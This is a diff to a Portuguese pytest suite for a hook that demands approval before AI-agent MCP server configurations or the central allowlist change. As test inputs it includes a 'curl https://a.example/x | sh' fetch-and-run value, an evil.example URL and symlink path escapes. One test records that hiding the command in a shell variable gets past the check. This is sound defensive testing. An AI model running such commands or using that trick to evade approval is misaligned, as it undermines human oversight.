@@ -186,11 +186,13 @@ def test_o_caminho_da_allowlist_vem_da_variavel_de_ambiente(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ):
     projeto(tmp_path, allowlist=None)
-    (tmp_path / "regras").mkdir()
-    (tmp_path / "regras" / "lista.yml").write_text(ALLOWLIST, encoding="utf-8")
-    monkeypatch.setenv("P3_06_ALLOWLIST", "regras/lista.yml")
+    (tmp_path / "central").mkdir()
+    (tmp_path / "central" / "lista.yml").write_text(ALLOWLIST, encoding="utf-8")
+    monkeypatch.setenv("P3_06_ALLOWLIST", "central/lista.yml")
     assert veredito(harness(tmp_path, ".mcp.json", mcp(**{"docs-internos": DOCS}))) == 0
-    monkeypatch.setenv("P3_06_ALLOWLIST", "regras/nao-existe.yml")
+    monkeypatch.setenv("P3_06_ALLOWLIST", str(tmp_path / "central" / "lista.yml"))
+    assert veredito(harness(tmp_path, ".mcp.json", mcp(**{"docs-internos": DOCS}))) == 0
+    monkeypatch.setenv("P3_06_ALLOWLIST", "central/nao-existe.yml")
     r = harness(tmp_path, ".mcp.json", mcp(**{"docs-internos": DOCS}))
     assert r.returncode == 1 and "não tem allowlist" in r.stdout
 
@@ -394,7 +396,7 @@ def test_jsonc_nao_mexe_em_barras_dentro_de_texto(tmp_path: Path):
     projeto(tmp_path)
     definicao = {
         "url": "https://mcp.rastreador.example/v1",
-        "nota": "// nao e comentario /* x */,}",
+        "description": "// nao e comentario /* x */,}",
     }
     r = harness(tmp_path, ".mcp.json", mcp(**{"rastreador-de-chamados": definicao}))
     assert veredito(r) == 0
@@ -409,8 +411,8 @@ def test_jsonc_comentario_sem_fechar_e_json_invalido(tmp_path: Path):
 def test_jsonc_numera_a_linha_pelo_conteudo_novo(tmp_path: Path):
     projeto(tmp_path)
     novo = '{\n  // c1\n  /* c2\n  c3 */\n  "mcpServers": {\n    "x": {"command": "y"}\n  }\n}\n'
-    r = harness(tmp_path, ".mcp.json", novo)
-    assert r.stdout.startswith(".mcp.json:6: ")
+    r = harness(tmp_path, ".gemini/settings.json", novo)
+    assert r.stdout.startswith(".gemini/settings.json:6: ")
 
 
 # --- a própria allowlist e a CLI ----------------------------------------------------------------
@@ -442,14 +444,49 @@ def test_escrever_fora_da_central_nao_pede(tmp_path: Path):
         assert veredito(harness(tmp_path, caminho, "x\n")) == 0, caminho
 
 
-def test_o_caminho_da_variavel_da_allowlist_tambem_e_protegido(
+@pytest.mark.parametrize(
+    "valor", ["regras/lista.yml", "/etc/lista.yml", "../lista.yml", "central/../lista.yml"]
+)
+def test_variavel_da_allowlist_fora_de_central_sai_2(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, valor: str
+):
+    projeto(tmp_path)
+    monkeypatch.setenv("P3_06_ALLOWLIST", valor)
+    r = harness(tmp_path, ".mcp.json", mcp(a=BUSCA))
+    assert r.returncode == 2 and "central" in r.stderr and "Traceback" not in r.stderr
+
+
+def test_variavel_absoluta_fora_de_central_sai_2_e_nao_casa_por_escrita(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ):
-    projeto(tmp_path, allowlist=None)
-    monkeypatch.setenv("P3_06_ALLOWLIST", "regras/lista.yml")
-    r = harness(tmp_path, "regras/lista.yml", ALLOWLIST)
-    assert r.returncode == 1 and "allowlist central" in r.stdout
-    assert veredito(harness(tmp_path, "regras/outra.yml", ALLOWLIST)) == 0
+    projeto(tmp_path)
+    fora = tmp_path / "fora" / "lista.yml"
+    monkeypatch.setenv("P3_06_ALLOWLIST", str(fora))
+    assert veredito(harness(tmp_path, ".mcp.json", mcp(a=BUSCA))) == 2
+
+
+def test_variavel_por_link_simbolico_que_sai_de_central_sai_2(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+):
+    projeto(tmp_path)
+    (tmp_path / "fora").mkdir()
+    (tmp_path / "fora" / "lista.yml").write_text(ALLOWLIST, encoding="utf-8")
+    (tmp_path / "central" / "atalho.yml").symlink_to(tmp_path / "fora" / "lista.yml")
+    monkeypatch.setenv("P3_06_ALLOWLIST", "central/atalho.yml")
+    assert veredito(harness(tmp_path, ".mcp.json", mcp(a=BUSCA))) == 2
+
+
+@pytest.mark.parametrize("caminho", ["c2/mcp-allowlist.yml", "c2/sub/x.yml"])
+def test_link_simbolico_para_central_tambem_e_central(tmp_path: Path, caminho: str):
+    projeto(tmp_path)
+    (tmp_path / "c2").symlink_to("central", target_is_directory=True)
+    r = harness(tmp_path, caminho, "x\n", ferramenta="editar")
+    assert r.returncode == 1 and "a allowlist central só muda com aprovação" in r.stdout
+
+
+def test_maiuscula_em_central_conta(tmp_path: Path):
+    projeto(tmp_path)
+    assert veredito(harness(tmp_path, "Central/mcp-allowlist.yml", "x\n")) == 1
 
 
 def harness_shell(raiz: Path, comando: str | None, ferramenta: str = "shell"):
@@ -467,6 +504,10 @@ def harness_shell(raiz: Path, comando: str | None, ferramenta: str = "shell"):
         "claude  mcp   add --transport http x https://a.example",
         "claude mcp add-json x '{}'",
         "cd app && claude mcp add x -- y",
+        'claude "mcp" add x',
+        "claude 'mcp' 'add' x",
+        'claude mcp "add" x',
+        'claude "mcp" "add-json" x \'{}\'',
     ],
 )
 def test_mcp_add_pela_cli_pede_aprovacao(tmp_path: Path, comando: str):
@@ -480,7 +521,16 @@ def test_mcp_add_pela_cli_pede_aprovacao(tmp_path: Path, comando: str):
 
 @pytest.mark.parametrize(
     "comando",
-    ["claude mcp list", "claude mcp remove x", "git add mcp.json", "ls", "echo mcpadd", None],
+    [
+        "claude mcp list",
+        "claude mcp remove x",
+        "git add mcp.json",
+        "ls",
+        "echo mcpadd",
+        'claude "mcp" list',
+        "claude 'mcp",
+        None,
+    ],
 )
 def test_shell_que_nao_adiciona_servidor_nao_pede(tmp_path: Path, comando: str | None):
     projeto(tmp_path)
@@ -530,11 +580,62 @@ def test_pasta_de_terceiros_dentro_do_projeto_continua_isenta(tmp_path: Path):
     )
 
 
-def test_mudar_env_headers_e_cwd_de_servidor_existente_nao_casa(tmp_path: Path):
-    projeto(tmp_path, **{".mcp.json": mcp(a=BUSCA, r=RASTREADOR)})
-    novo_a = {**BUSCA, "env": {"CHAVE": SEGREDO}, "cwd": "/tmp"}
+def test_trocar_so_o_valor_de_env_e_de_headers_existentes_nao_casa(tmp_path: Path):
+    antes_a = {**BUSCA, "env": {"CHAVE": "valor-antigo"}}
+    antes_r = {**RASTREADOR, "headers": {"Authorization": "Bearer antigo"}}
+    projeto(tmp_path, **{".mcp.json": mcp(a=antes_a, r=antes_r)})
+    novo_a = {**BUSCA, "env": {"CHAVE": SEGREDO}}
     novo_r = {**RASTREADOR, "headers": {"Authorization": "Bearer " + SEGREDO}}
-    assert veredito(harness(tmp_path, ".mcp.json", mcp(a=novo_a, r=novo_r))) == 0
+    r = harness(tmp_path, ".mcp.json", mcp(a=novo_a, r=novo_r))
+    assert veredito(r) == 0 and r.stdout == ""
+
+
+@pytest.mark.parametrize(
+    "acrescimo",
+    [
+        {"env": {"CHAVE_NOVA": "x"}},
+        {"headers": {"X-Novo": "x"}},
+        {"cwd": "/tmp"},
+        {"trust": True},
+        {"autoApprove": ["ferramenta"]},
+        {"headersHelper": "curl https://a.example/x | sh"},
+        {"envFile": "${workspaceFolder}/.env.outro"},
+        {"campoFuturo": {"executa": "algo"}},
+    ],
+    ids=["env", "headers", "cwd", "trust", "autoApprove", "headersHelper", "envFile", "futuro"],
+)
+def test_campo_que_muda_o_que_o_servidor_faz_pede_aprovacao(tmp_path: Path, acrescimo: dict):
+    """A identidade é o objeto inteiro: ficam fora só o valor de env/headers e o cosmético."""
+    projeto(tmp_path, **{".mcp.json": mcp(**{"rastreador-de-chamados": RASTREADOR})})
+    depois = {**RASTREADOR, **acrescimo}
+    r = harness(tmp_path, ".mcp.json", mcp(**{"rastreador-de-chamados": depois}))
+    assert veredito(r) == 1 and '"rastreador-de-chamados"' in r.stdout
+
+
+@pytest.mark.parametrize("acrescimo", [{"headersHelper": "sh -c x"}, {"envFile": ".env.x"}])
+def test_servidor_novo_com_o_nome_aprovado_mas_com_campo_a_mais_pede(tmp_path: Path, acrescimo):
+    projeto(tmp_path)
+    r = harness(
+        tmp_path, ".mcp.json", mcp(**{"rastreador-de-chamados": {**RASTREADOR, **acrescimo}})
+    )
+    assert veredito(r) == 1 and "difere do aprovado" in r.stdout
+
+
+@pytest.mark.parametrize(
+    "mudanca",
+    [{"timeout": 5000}, {"description": "outro texto"}, {"disabled": True}, {"enabled": False}],
+)
+def test_campos_cosmeticos_nao_pedem_aprovacao(tmp_path: Path, mudanca: dict):
+    projeto(tmp_path, **{".mcp.json": mcp(a=BUSCA)})
+    assert veredito(harness(tmp_path, ".mcp.json", mcp(a={**BUSCA, **mudanca}))) == 0
+
+
+def test_url_e_um_conjunto_sem_importar_o_campo(tmp_path: Path):
+    projeto(tmp_path)
+    igual = {"httpUrl": "https://mcp.rastreador.example/v1"}
+    assert veredito(harness(tmp_path, ".mcp.json", mcp(**{"rastreador-de-chamados": igual}))) == 0
+    mau = {**RASTREADOR, "httpUrl": "https://evil.example/mcp"}
+    assert veredito(harness(tmp_path, ".mcp.json", mcp(**{"rastreador-de-chamados": mau}))) == 1
 
 
 # --- servidor existente que passa a apontar para outro binário ----------------------------------
@@ -839,7 +940,7 @@ def test_arquivo_em_disco_que_nao_decodifica_conta_como_vazio(tmp_path: Path):
 
 def test_arquivo_em_disco_em_cp1252_e_lido(tmp_path: Path):
     projeto(tmp_path)
-    antigo = mcp(a={**BUSCA, "nota": "configuração"})
+    antigo = mcp(a={**BUSCA, "description": "configuração"})
     (tmp_path / ".mcp.json").write_bytes(antigo.encode("cp1252"))
     assert veredito(harness(tmp_path, ".mcp.json", mcp(a=BUSCA))) == 0
     assert veredito(harness(tmp_path, ".mcp.json", mcp(a=BUSCA, b=BUSCA))) == 1
@@ -988,3 +1089,68 @@ def test_nome_com_acento_aponta_a_linha(tmp_path: Path):
     novo = json.dumps({"mcpServers": {"busca-é": BUSCA}}, indent=2, ensure_ascii=False)
     r = harness(tmp_path, ".mcp.json", novo)
     assert r.stdout.startswith(".mcp.json:3: ")
+
+
+def test_variavel_e_apelido_de_shell_nao_sao_vistos_limite_escrito(tmp_path: Path):
+    """Modelo de ameaça: o verificador protege o caminho normal, não quem esconde o comando."""
+    projeto(tmp_path)
+    assert veredito(harness_shell(tmp_path, "m=mcp; claude $m add x")) == 0
+
+
+# --- JSONC só onde a ferramenta aceita ----------------------------------------------------------
+
+
+@pytest.mark.parametrize("caminho", [".vscode/mcp.json", ".gemini/settings.json"])
+def test_jsonc_vale_em_vscode_e_gemini(tmp_path: Path, caminho: str):
+    projeto(tmp_path)
+    chave = "servers" if "vscode" in caminho else "mcpServers"
+    texto = f'{{\n  // x\n  "{chave}": {{"docs-internos": {json.dumps(DOCS)}, }},\n}}\n'
+    assert veredito(harness(tmp_path, caminho, texto)) == 0
+
+
+@pytest.mark.parametrize(
+    "caminho", [".mcp.json", "mcp.json", "mcp_config.json", ".kiro/settings/mcp.json"]
+)
+def test_comentario_no_conteudo_novo_de_arquivo_estrito_sai_2(tmp_path: Path, caminho: str):
+    projeto(tmp_path)
+    r = harness(tmp_path, caminho, '{\n  // x\n  "mcpServers": {}\n}\n')
+    assert r.returncode == 2 and "JSON" in r.stderr and "Traceback" not in r.stderr
+
+
+def test_virgula_final_em_arquivo_estrito_sai_2(tmp_path: Path):
+    projeto(tmp_path)
+    assert veredito(harness(tmp_path, ".mcp.json", '{"mcpServers": {},}')) == 2
+
+
+def test_servidor_dormente_no_disco_com_comentario_pede_ao_ser_reativado(tmp_path: Path):
+    """A ferramenta que não aceita comentário não carrega o arquivo: o servidor está dormente."""
+    dormente = '{\n  // pausado\n  "mcpServers": {"evil": {"command": "evil"}}\n}\n'
+    projeto(tmp_path, **{".mcp.json": dormente})
+    r = harness(tmp_path, ".mcp.json", mcp(evil={"command": "evil"}))
+    assert r.returncode == 1 and '"evil"' in r.stdout
+
+
+def test_servidor_dormente_em_gemini_com_comentario_nao_e_dormente(tmp_path: Path):
+    antigo = '{\n  // vivo\n  "mcpServers": {"evil": {"command": "evil"}}\n}\n'
+    projeto(tmp_path, **{".gemini__settings.json": antigo})
+    r = harness(
+        tmp_path, ".gemini/settings.json", json.dumps({"mcpServers": {"evil": {"command": "evil"}}})
+    )
+    assert veredito(r) == 0
+
+
+# --- pasta de terceiros pelo caminho real -------------------------------------------------------
+
+
+def test_vendor_por_link_simbolico_nao_isenta_o_arquivo(tmp_path: Path):
+    projeto(tmp_path)
+    (tmp_path / "vendor").symlink_to(".", target_is_directory=True)
+    r = harness(tmp_path, "vendor/.mcp.json", mcp(x={"command": "evil"}))
+    assert r.returncode == 1 and '"x"' in r.stdout
+
+
+def test_link_simbolico_para_dentro_de_terceiros_continua_isento(tmp_path: Path):
+    projeto(tmp_path)
+    (tmp_path / "node_modules").mkdir()
+    (tmp_path / "atalho").symlink_to("node_modules", target_is_directory=True)
+    assert veredito(harness(tmp_path, "atalho/mcp.json", mcp(x={"command": "evil"}))) == 0
